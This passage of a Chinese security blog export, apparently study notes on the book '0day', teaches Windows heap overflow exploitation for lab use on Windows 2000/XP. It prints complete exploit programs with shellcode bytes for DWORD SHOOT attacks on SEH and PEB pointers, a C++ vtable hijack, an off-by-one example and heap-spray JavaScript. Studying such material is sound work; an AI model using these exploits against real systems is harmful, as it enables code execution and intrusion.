90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;// head of the ajacent free block&quot;\\x88\\x06\\x52\\x00&quot;//0x00520688 is the address of shellcode in first//Heapblock&quot;\\x90\\x90\\x90\\x90&quot;;//target of DWORD SHOOTDWORD MyExceptionhandler(void)&#123; ExitProcess(1);&#125;main()&#123; HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200); memcpy(h1,shellcode,0x200);// over flow here, noticed 0x200 means //512 ! __asm int 3 // uesd to break the process __try &#123; h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); &#125; __except(MyExceptionhandler())&#123;&#125; return 0;&#125; 实验思路： （ 1）溢出第一个堆块的数据将写入后面的空闲堆块，在第二次堆分配时发生 DWORD SHOOT。 （ 2）将 S.E.H 的异常回调函数地址作为 DWORD SHOOT 的目标，将其替换为 shellcode 的入口地址，异常发生后，操作系统将错误地把 shellcode 当作异常处理函数而执行。 推荐使用的环境 备 注 操作系统 Windows 2000 虚拟机和实体机均可。 编译器 Visual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 必须使用 release 版本进行调试 说明： 即使完全按照推荐的实验环境进行操作， S.E.H 中异常回调函数句柄的地址及 shellcode 的起始地址可能仍然需要在调试中重新确定。 第一步：找到 S.E.H 的位置 和 shellcode 的位置 首先，我们把 DWORD SHOOT 最后 4 个字节的 target 设置为一个无效的内存地址，如0x90909090，让程序触发异常。我们所需要做的就是在程序运行时，找到 S.E.H 的位置，然后把 DWORD SHOOT 的 target 指向 S.E.H 的回调句柄。 在调试前应当确认 OllyDbg 能够捕捉所有的异常，方法是查看菜单“options”下的“debugging option”中“ Exceptions”选项中没有忽略任何类型的异常，如下图所示 然后编译运行代码，程序会自动中断，进入 OllyDbg。在寄存器 EAX 中，显示了HeapAlloc（）函数分配的堆的地址，即 shellcode 的起始位置，如下图所示，这里 EAX = 0x00360688 跳过中断后，按 F9 继续运行，DWORD SHOOT 发生后，程序产生异常。OllyDbg 捕捉到异常后会自动中断，如下图所示 这时查看栈中 S.E.H 情况：View —&gt; SEH chain，如下图所示 第二步：组织缓冲区 发现离第一个 S.E.H 位于 0x0012FEEC 的地方，那么异常回调函数的句柄应该位于这个地址后 4 个字节的位置 0x0012FEF0。现在，将 DWORD SHOOT 的目标地址由 0x90909090 改为 0x0012FEF0，去掉程序中的中断指令，重新编译运行。 12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;windows.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x16\\x01\\x1A\\x00\\x00\\x10\\x00\\x00&quot;// head of the ajacent free block &quot;\\x88\\x06\\x36\\x00&quot;//0x00360688 is the address of shellcode in first //Heapblock&quot;\\xF0\\xFE\\x12\\x00&quot;;//target of DWORD SHOOTDWORD MyExceptionhandler(void)&#123; ExitProcess(1);&#125;main()&#123; HLOCAL h1 = 0, h2 = 0; HANDLE hp; hp = HeapCreate(0,0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,200); memcpy(h1,shellcode,0x200);// over flow here, noticed 0x200 means //512 ! __asm int 3 // uesd to break the process __try &#123; h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); &#125; __except(MyExceptionhandler())&#123;&#125; return 0;&#125; 但是，在我在运行时，有问题，如下图 这里执行了未知指令，也就是F0:FE ，查看内存可以发现，在地址0x0036068C处我们的 shellcode 已经被修改为了F0 FE 12 00。 这就是 DWORD SHOOT 后的 “指针反射” 现象，在双向链表拆除时第二次链表操作导致了 DWORD SHOOT。DWORD SHOOT 把目标地址 0012FEFO 写回 shellcode 起始位置偏移 4 个字节的地方 0036068c。 这里我们把 F0 FE 12 00修改为 EB 02 12 00（这里只要能够跳转后一条指令就行），使得 EIP 跳到了0x00360690处开始执行从而避免了指针反射造成的错误，如下图 深入挖掘 Windows 异常处理 （1）不同级别的 S.E.H 异常处理的最小作用域是线程，每个线程都有自己的 S.E.H 链表。 异常处理流程 ：线程 —&gt; 进程 —&gt; 系统 —&gt; 终止 首先执行线程中距离栈顶最近的 S.E.H 的异常处理函数。 若失败，则依次尝试执行 S.E.H 链表中后续的异常处理函数。 若 S.E.H 链中所有的异常处理函数都没能处理异常，则执行进程中的异常处理。 若仍然失败，系统默认的异常处理将被调用，其结果是显示错误对话框。 （2）线程的异常处理 线程中异常处理的回调函数的参数和返回值（回调函数执行前，操作系统将断点信息压栈）： 参数 pExcept：指向一个结构体 EXCEPTION_RECORD。该结构体包含了若干 与异常相关的信息，如异常的类型、异常发生的地址等。 pFrame：指向栈帧中的 S.E.H 结构体。 pContext：指向 Context 结构体。该结构体中包含了所有寄存器的状态。 pDispatch：未知用途。 返回值 0 (ExceptionContinueExcetution)：代表异常处理成功，将返回原程序发生异常的地方，继续执行。 1 (ExceptinoContinueSearch)：代表异常处理失败，将顺着 S.E.H 链表搜索其它可用于异常处理的函数并尝试处理。 线程的异常处理中还有一个叫 unwind 操作。 unwind 定义：在异常发生时，系统会顺着 S.E.H链表搜索能处理异常的句柄；一旦找到，系统会把已经遍历过的异常处理函数再调用一遍，这个过程就是 unwind 操作，第二轮调用就是 unwind 调用。 unwind 目的：”通知“ 前面处理异常失败的 S.E.H 释放资源，之后这些 S.E.H 结构体将被从链表中拆除。进而避免进行多次异常处理。 unwind 操作确保了异常处理机制自身的完整性和正确性。下图是一个没有使用 unwind 操作而导致异常处理机制自身产生错误的例子。 异常处理函数第一轮调用，用来处理异常，第二轮的 unwind 调用时，释放资源。那么异常回调函数怎么直到自己是第几轮调用呢？ 答案在回调函数的第一个参数 pExcept 所指向的 EXCEPTION_RECORD 结构体。 12345678typedef struct _EXCEPTION_RECORD &#123; DWORD ExceptionCode; DWORD ExceptionFlags; //异常标志位 struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS];&#125; EXCEPTION_RECORD; 当 ExceptionCode = 0xC0000027(STATUS_UNWIND)，ExceptionFlags = 2(EH_UNWINDING) 时，对回调函数的调用就属于 unwind 调用。 unwind 操作通过 kernerl.32 中的一个导出函数 RtlUnwind 实现，实际上 kernel32.dll 会转而再去调用 ntdll.dll 中的同名函数。 123456void RtlUnwind( PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue); **补充：**在使用回调函数之前，系统会判断当前是否处于调试状态，如果处于调试状态，将把异常交给调试器处理。 （3）进程的异常处理 进程的异常处理回调函数需要通过 API 函数 SetUnhandledExceptionFilter 来注册 。 123LPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter); 提示： 您可以简单地把线程异常处理对应为代码中的__try{} __ except(){}或者 Assert等语句，把进程的异常处理对应于函数 SetUnhandledExceptionFilter。 进程的异常处理函数的返回值： 1（ EXCEPTION_EXECUTE_HANDLER）：表示错误得到正确的处理，程序将退出。 0（ EXCEPTION_CONTINUE_SEARCH）：无法处理错误，将错误转交给系统默认的异常处理。 -1（ EXCEPTION_CONTINUE_EXECUTION）：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。 （4）系统默认的异常处理 U.E.F 系统默认的异常处理函数 UnhandledExceptionFilter()，简称 【U.E.F】UnhandledExceptionFilter() 将首先检查注册表 HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\AeDebug 下的表项，如下图所示。 路径下的 Auto 表项代表是否弹出错误对话框，值为 1 表示不弹出错误对话框直接结束程序，其余值均会弹出提示错误的对话框。 注册表的 Debugger 指明了系统默认的调试器，在错误框弹出后，如果您选择调试，UnhandledExceptionFilter 就会按照这里的命令加载相应的调试器。 （5）异常处理流程的总结 windows 2000 异常处理的基本流程： CPU 执行时发生并捕获异常，内核接过进程的控制权，开始内核态的异常处理。 内核异常处理结束，将控制权还给 ring3。 ring3 中第一个处理异常的函数是 ntdll.dll 中的 KiUserExceptionDispatcher()函数。 KiUserExceptionDispatcher()首先检查程序是否处于调试状态。如果程序正在被调试，会将异常交给调试器进行处理。 在非调试状态下，KiUserExceptionDispatcher() 调用 RtlDispatchException()函数对线程的 S.E.H 链表进行遍历，如果找到能够处理异常的回调函数，将再次遍历先前调用过的 S.E.H 句柄，即 unwind 操作，以保证异常处理机制自身的完整性。 如果栈中所有的 S.E.H 都失败了，且用户曾经使用过 SetUnhandledExceptionFilter()函数设定进程异常处理，则这个异常处理将被调用，即调用用户自定义进程异常处理函数。 如果用户自定义的进程异常处理失败，或者用户根本没有定义进程异常处理，那么系统默认的异常处理 UnhandledExceptionFilter()将被调用。 U.E.F 会根据注册表里的相关信息决定是默默地关闭程序，还是弹出错误对话框。 其它异常处理机制的利用思路 V.E.H 利用 从 Windows XP 开始，在原来的异常处理机制上增加了一种新的异常处理：V.E.H ( Vectored Exception Handler，向量化异常处理 )。 V.E.H 要点： （1）V.E.H 使用 API 注册回调函数。 1234PVOID AddVectoredExceptionHandler( ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER VectoredHandler); （2）V.E.H 结构 123456struct _VECTORED_EXCEPTION_NODE&#123; DWORD m_pNextNode; DWORD m_pPreviousNode; PVOID m_pfnVectoredHandler;&#125; （3）可以注册多个 V.E.H，V.E.H结构体间串成双向链表，保存在堆中。 （4）调用顺序：KiUserExceptionDispatcher() 首先检查是否被调试，然后检查 V.E.H 链表，最后检查 S.E.H 链表。 （5）注册 V.E.H 时，可以指定其在链表中的位置，不必像 S.E.H 按照注册顺序压栈。 （6）unwind 操作只对栈帧中的 S.E.H链起作用，不涉及 V.E.H **V.E.H 利用思路：**如果能用堆溢出的 DWORD SHOOT 修改指向 V.E.H 头结点的指针，在异常处理开始后，就能引导程序执行 shellcode 了。 标识 V.E.H 链表头节点的指针位于 0x77FC3210 攻击 TEB 中的 S.E.H 头节点 **攻击思路：**线程的 S.E.H 链通过 TEB 的第一个 DWORD 标识(fs:0)，这个指针永远指向离栈顶最近的那个 S.E.H。如果能够修改 TEB 中的这个指针，在异常发生时就能将程序引导到 shellcode 中去执行。 TEB（线程环境块）要点： （1）一个进程可能同时存在多个线程。 （2）每个线程都有一个线程环境块 TEB。 （3）第一个 TEB 开始于 0x7FFDE000。 （4）之后新建线程的 TEB 紧随前边的 TEB ，相隔 0x1000字节，并向内存低址方向增长。 （5）当线程退出时，对应的 TEB 也被销毁，腾出的 TEB 空间可以被新建的线程重复使用。 攻击 TEB 中 S.E.H 头节点的方法一般用于单线程的程序，不适合攻击多线程的程序，是因为，多线程的 TEB 很难判断到底是哪一个线程的。 攻击U.E.F U.E.F【UnhandledExceptionFilter()】即系统默认的异常处理函数，是系统处理异常的最后一个环节。 由于 U.E.F 句柄在不同操作系统和补丁版本下可能不同，所以在攻击前需要确定 U.E.F 句柄，即反汇编（用IDA）kernel32.dll 中的导出函数 SetUnhandledExceptionFilter()。 补充：U.E.F 利用时，结合使用跳板技术能使 exploit 成功率更高。 异常发生时，EDI 往往仍然指向堆中离 shellcode 不远处，把 U.E.F 的句柄覆盖成一条 call dword ptr [edi+0x78]的指令地址往往能让程序跳到 shellcode 中。其它具有定位 shellcode 的指令： 12call dword ptr [ESI+0x4C]call dword ptr [EBP+0x74] 此外，EDI的跳转并不能保证百分之百成功。 攻击 PEB 中的函数指针 PEB 的位置永远不变。 上一次堆溢出的最后一个实验中，通过 DWORD SHOOT 修改 PEB 中函数地址，那么当调用函数时，程序就被我们引导去执行 shellcode 代码。 “off by one” 的利用 Halvar Flake 在“ Third Generation Exploitation”中，按照攻击的难度把漏洞利用技术分成 3个层次。 （ 1）第一类是基础的栈溢出利用。攻击者可以利用返回地址等轻松劫持进程，植入 shellcode，例如，对 strcpy、 strcat 等函数的攻击等。 （ 2）第二类是高级的栈溢出利用。这时，栈中有诸多的限制因素，溢出数据往往只能淹没部分的 EBP，而无法抵达返回地址的位置。这种漏洞利用的典型例子就是对 strncpy 函数误用时产生的 “off by one” 漏洞的利用。 （ 3）第三类攻击则是堆溢出利用及格式化串漏洞的利用。 off by one 的利用代码示例： 1234567891011void off_by_one(char * input)&#123; char buf[200]; int i=0,len=0; len=sizeof(buf); for(i=0; input[i]&amp;&amp;(i&lt;=len); i++) //这里应该是i&lt;len &#123; buf[i]=input[i]; &#125;……&#125; 第 6 行代码中，循环条件中的i&lt;=len就给攻击者一个字节的溢出机会。这种边界控制上的错误就是 “off by one” 问题。 这时，如果缓冲区后面紧跟着 EBP 和返回地址，那么这溢出的一个字节，将有机会覆盖 EBP 的最低位字节，也就是说我们能在255个字节的范围内移动 EBP，让程序执行我们指定位置的恶意代码。 此外，off by one 可能破坏重要的临界变量，从而导致程序流程改变，或者整数溢出等更深层次的问题。 攻击 C++ 的虚函数 虚函数与虚表的要点： （ 1）用关键字 virtual 修饰声名的类成员函数，叫虚函数 ​ （ 2）一个类用可能有多个虚函数 ​ （ 3）虚表（vatable）中保存着类的所有虚函数的入口地址。 ​ （ 4）对象使用虚函数时，先通过虚表指针找到虚表，然后从虚表中找到虚函数的入口地址。 ​ （ 5）虚表指针保存在对象的内存空间中，与其它成员变量相邻。 ​ （ 6）虚函数只有通过对象指针的引用才能显示其动态调用的特性。 如果能溢出对象的成员变量，就有机会修改虚表指针或修改虚表中的虚函数指针，从而运行 shellcode 实现代码即相关说明 表 6-3-1 实验环境 推荐使用的环境 备 注 操作系统 Windows XP SP2 其他 Win32 操作系统也可进行本实验 编译器 Visual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 说明： 伪造的虚表指针和虚函数指针依赖于实验机器，可能需要通过动态调试重新确定，您也可以通过在程序中简单地打印出 overflow.buf 的地址，从而计算出这两个值 123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &quot;windows.h&quot;#include &quot;iostream.h&quot;#include &quot;stdio.h&quot;char shellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x77\\x65\\x73\\x74\\x68\\x66\\x61\\x69\\x6C\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x44\\xE2\\x42\\x00&quot;;//set fake virtual function pointerclass Failwest&#123;public: char buf[200]; virtual void test(void) &#123; cout&lt;&lt;&quot;Class Vtable::test()&quot;&lt;&lt;endl; &#125;&#125;;Failwest overflow, *p;void main(void)&#123; char * p_vtable; printf(&quot;%p\\n&quot;,overflow.buf); p_vtable=overflow.buf-4;//point to virtual table //__asm int 3 //reset fake virtual table to 0x004088cc //the address may need to ajusted via runtime debug p_vtable[0]=0xf4; p_vtable[1]=0xe2; p_vtable[2]=0x42; p_vtable[3]=0x00; strcpy(overflow.buf,shellcode);//set fake virtual function pointer p=&amp;overflow; p-&gt;test();&#125; 代码说明： （ 1）虚表指针位于 char buf[200] 之前，通过 p_vtable = overflow.buf - 4 定位这个指针。 ​ （ 2）修改虚表指针指向缓冲区的 0x0042e2f4 处，把0x0042e2f4里存放的内容当作虚函数指针，即0042e244 ​ （ 3）程序执行到 p-&gt;rest() 时，将会把0x0042e2f4处的内容取出，即 0x0042e244 ，然后把它当作函数的入口地址，进而去执行 0x0042e244 处的指令，即我们的 shellcode 代码。 运行程序后出现的结果： 由于虚表指针位于成员变量前，溢出只能向后覆盖数据，所以这种利用方式在 “数组溢出”或“连续性覆盖” 的场景下有局限。 当然，如果内存中有多个对象且能溢出到下一个对象空间中去，“连续性覆盖” 还是有攻击机会的，如下图 Heap Spray：堆与栈的协同攻击 攻击浏览器时，常常结合使用堆和栈的协同利用漏洞。 （1）当浏览器或插件中存在溢出漏洞时，攻击者就可以生成一个特殊的 HTML 文件来触发这个漏洞。 （2）漏洞触发后最终都能获得 EIP （3）有时我们很难在浏览器中布置完整的 shellcode （4）JavaScript 可以申请堆内存，所以，把 shellcode 通过 JavaScript 布置在堆中。 如何定位 shellcode 呢？Heap Spray 技术就是为了解决这个问题。 **攻击思路：**在使用 Heap Spray时，一般会人为的把 EIP 指向堆区的 0x0C0C0C0C 位置，然后用 JavaScript 申请大量堆内存，并用包含着 0x90 和 shellcode 的 ”内存片“ 覆盖这些内存。 JavaScript 会从内存低址向高址分配内存，因此申请内存超过 200MB（200MB = 200*1024*1024 = 0x0C800000 &gt; 0x0C0C0C0C）后，0x0C0C0C0C 将被含有 shellcode 的内存片覆盖。只要 0x90 能命中 0x0C0C0C0C 的位置，shellcode 最终就能执行。 使用下面 JavaScript 代码产生的内存片来覆盖内存。 1234567891011var nop=unescape(&quot;%u9090%u9090&quot;);while (nop.length&lt;= 0x100000/2)&#123; nop+=nop;&#125;//生成一个 1MB 大小充满 0x90 的数据块nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2 );var slide = new Arrary();for (var i=0; i&lt;200; i++)&#123; slide[i] = nop + shellcode&#125; 代码说明： （1）每个内存片大小为 1MB （2）首先产生一个大小为 1MB 且全部被 0x90 填满的内存。 （3）由于 JavaScript 会为申请到的内存填上一些额外的信息，为了保证内存片恰好是 1MB，我们将这些额外信息所占的空间减去。 额外信息 SIZE 说 明 malloc header 32 bytes 堆块信息 string length 4 bytes 表示字符串长度 terminator 2 bytes 字符串结束符，两个字节的 NULL （4）最终我们将使用 200 个这种形式的内存片来覆盖堆内存，只要其中任意一片的 nop 区能够覆盖 0x0C0C0C0C，攻击就可以成功 **为什么采用 1MB 大小作为内存片的单位呢？**在 Heap Spray 时，内存片相对于 shellcode 和额外的内存信息来说应该“足够大”，这样 nop 区域命中 0x0C0C0C0C 的几率将相对增加；如果内存片较小， shellcode 或额外的内存信息将有可能覆盖 0x0C0C0C0C，导致溢出失败。 1MB的内存相对于 200 字节左右的 shellcode，可以让 exploit 拥有足够的稳定性。 参考：《0day,软件安全漏洞分析技术》","categories":[{"name":"0day安全","slug":"0day安全","permalink":"https://www.rgzzplus.com/categories/0day%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"内存攻击","slug":"内存攻击","permalink":"https://www.rgzzplus.com/tags/%E5%86%85%E5%AD%98%E6%94%BB%E5%87%BB/"}]},{"title":"堆溢出","slug":"堆溢出","date":"2022-04-15T15:32:13.000Z","updated":"2022-08-01T10:29:55.279Z","comments":true,"path":"2022/04/15/堆溢出/","link":"","permalink":"https://www.rgzzplus.com/2022/04/15/%E5%A0%86%E6%BA%A2%E5%87%BA/","excerpt":"","text":"如果你不了解堆的话，请先看我的上一篇博文《堆的工作原理》，然后再来学习堆溢出，结合食用，更易理解。 [TOC] 堆溢出利用（上）—— DWORD SHOOT 链表“拆卸”中的问题 堆管理系统三类操作：堆块分配、堆块释放、堆块合并。 这三种操作实际上是对链表的修改，如果我们能伪造链表结点的指针，那么在 “卸下” 和 “链入” 过程中就可能获得一次读写内存的机会。 堆溢出的精髓：用特殊的数据去溢出下一个堆块的块首，改写块首的前向指针（flink）和后向指针（blink），然后在分配、释放、合并等操作发生时伺机获得一次向内存任意地址写入任意数据的机会。 **DWORD SHOOT：**向内存任意地址写入任意数据。 点射目标（Target） 子弹（payload） 改写后的结果 栈帧中的函数返回地址 shellcode 起始地址 函数返回时，跳去执行 shellcode 栈帧中的 S.E.H 句柄 shellcode 起始地址 异常发生时，跳去执行 shellcode 重要函数调用地址 shellcode 起始地址 函数调用时，跳去执行 shellcode 注意： DWORD SHOOT 发生时，我们不但可以控制射击的目标（任意地址），还可以选用适当的子弹（填充的 4 字节恶意数据）。 DWORD SHOOT 原理 下面我们讲解，将一个结点从双向链表中 “拆卸” 下来的过程中，是怎么向任意地址写入任意数据的（即DWORD SHOOT） 123456int remove (ListNode * node)&#123; node -&gt; blink -&gt; flink = node -&gt; flink; node -&gt; flink -&gt; blink = node -&gt; blink; return 0;&#125;//正常拆卸结点的函数 正常拆卸过程，正如下面 图5.3.1 过程一样。 但是当我们利用堆溢出，把 Node 的块首覆盖后，node -&gt; flink（前向指针）与node -&gt; blink（后向指针）也就能伪造了。 这时，如果继续执行堆块 “拆卸”，实际上是执行node -&gt; blink(fake) -&gt; flink = node -&gt; flink(fake);即 Target -&gt; flink = node -&gt; flink(fake);，如下面的 图5.3.2 所示。 调试 实验环境 备注 操作系统 windows xp sp3虚拟机 分配策略对操作系统很敏感 编译器 Visrual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 如果使用 debug 版本，实验将会失败 按照堆表数据结构规定，堆的空表索引区在偏移0x0178处。在这个实验中空表索引区的地址是0x003a0178 12345678910111213141516171819202122232425#include &lt;windows.h&gt;int main()&#123; HLOCAL h1,h2,h3,h4,h5,h6; HANDLE hp; hp = HeapCreate(0, 0x1000,0x10000); h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); __asm int 3 //free block and prevent coalesing HeapFree(hp, 0, h1); HeapFree(hp, 0, h3); HeapFree(hp, 0, h5); h1 = HeapAlloc(hp,HEAP_ZERO_MEMOTY, 8); return 0;&#125; 步骤 与前面实验调试一样，先在 vc++6.0 中编译运行代码，然后跳转到 ollydbg，如下图 跳过断点指令：在004010E2处右击 --&gt; 选择设置新的运行点跳转，如下图 断点是刚好在 h6 创建完成后，在释放奇数堆块前，所以这时在我们还未释放堆块前，我们先来观察一下堆的空表索引区，除了freelist[0]中有一个大块的“堆尾”外，其它的都指向自己，因为还没有堆块释放挂入堆中，如下图 我们再来看看“堆尾”(003a06e8)，如下图，可以看到，h1 ~ h6 它们的前驱和后继指针都为空，只有“尾块”的前去后记指针指向freelist[0] 在执行完三次释放操作后，我们再来看看空表索引区，在freelist[2]中多出003a0688和003a06c8 接着再看看h1~h6堆块，在程序中释放掉的 h1, h3, h5 已经有了前驱和后继指针，被链入了freelist[2]中 这时，最后一次8字节的内存请求将会把原来的 h5分配出去，这意味着，将会中freelist2]的双向链表中 “卸下” 最后一个节点（h5），freelist[2]双向链表示意图，如下图所示 如果我们直接在内存中修改 h5 的空表指针（攻击时是由于溢出而改写的），那么应该能够观察到DWORD SHOOT现象 如下图所示，直接把 h5 的后继指针修改为44 44 44 44，前驱指针修改为00 00 00 00， 当最后一个分配请求函数被调用后，调试器被异常中断，因为无法将0x44444444写入00000000。 如果我们把射击目标定位合法地址，这条指令执行后，0x44444444将会被写入目标 堆溢出利用（下）——代码植入 DWORD SHOOT 的利用方法 与栈溢出中的“地毯式轰炸”不同，堆溢出更加精准，往往直接狙击重要目标。 DWORD SHOOT 的常用目标： 内存变量： 修改能够影响程序执行的重要标志变量，改变程序流程。 代码逻辑： 修改代码段重要函数的关键逻辑有时可以达到一定攻击效果，如逻辑判断代码或者身份验证函数。 函数返回地址： 由于栈帧移位，函数地址不固定，所以通过函数返回地址攻击，具有局限性 异常处理机制： 当程序产生异常时， Windows 会转入异常处理机制。堆溢出很容易引起异常，因此异常处理机制所使用的重要数据结构往往会成为 DWORD SHOOT 的上等目标，这包括 S.E.H（ structure exception handler）、 F.V.E.H（ First Vectored Exception Handler）、进程环境块（ P.E.B）中的 U.E.F (Unhandled Exception Filter)、线程环境块(T.E.B)中存放的第一个S.E.H 指针(T.E.H)。 函数指针： 系统有时会使用一些函数指针，比如调用动态链接库中的函数、 C++中的虚函数调用等。改写这些函数指针后，在函数调用发生后往往可以成功地劫持进程。 P.E.B 中线程同步函数的入口地址： 在每个进程的 P.E.B 中都存放着一对同步函数指针，指向RtlEnterCriticalSection()和 RtlLeaveCriticalSection()，并且在进程退出时会被 ExitProcess()调用。如果能够通过 DWORD SHOOT 修改这对指针中的其中一个，那么在程序退出时 ExitProcess()将会被骗去调用我们的 shellcode。由于 P.E.B 的位置始终不会变化，这对指针在 P.E.B 中的偏移也始终不变，这使得利用堆溢出开发适用于不同操作系统版本和补丁版本的 exploit 成为可能。 狙击 P.E.B 中 RtlEnterCritical-Section()的函数指针 当进程退出时，ExitProcess() 函数要做很多善后工作，其中一定会用到临界区函数RtlEnterCriticalSection() 和 RtlLeaveCriticalSection() 来同步线程防止异常数据产生。 ExitProcess() 函数调用临界区函数的方法比较独特，是通过进程环境块 P.E.B 中偏移 0x20 处存放的函数指针来间接完成的。具体说来就是在 0x7FFDF020 处存放着指向 RtlEnterCriticalSection() 的指针，在 0x7FFDF024 处存放着指向 RtlLeaveCriticalSection()的指针。 下面我们就以 0x7FFDF020处的 RtlEnterCriticalSection() 指针为目标，联系 DWORD SHOOT 后，劫持进程、植入代码。 调试 实验环境 备注 操作系统 windows 2000虚拟机 分配策略对操作系统很敏感 编译器 Visrual C++ 6.0 编译选项 默认编译选项 build 版本 release 版本 如果使用 debug 版本，实验将会失败 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485#include &lt;windows.h&gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\